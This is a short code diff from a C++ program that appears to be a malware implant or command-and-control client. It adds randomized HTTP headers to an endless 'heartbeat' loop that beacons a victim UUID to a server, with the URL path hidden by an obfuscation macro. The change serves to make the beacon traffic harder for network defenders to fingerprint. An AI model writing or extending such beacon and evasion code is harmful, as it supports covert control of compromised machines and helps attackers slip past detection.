@@ -15,6 +15,7 @@ static size_t write_cb(void* contents, size_t size, size_t nmemb, void* userp) {
 static void heartbeat(const std::string& server) {
     CURL* curl = curl_easy_init();
     if(!curl) return;
+    g_header_randomizer.apply(curl);
     while(true) {
         std::string url = server + OBFUSCATE("/heartbeat");
         std::string payload = "{\"uuid\":\"" + g_uuid + "\"}";
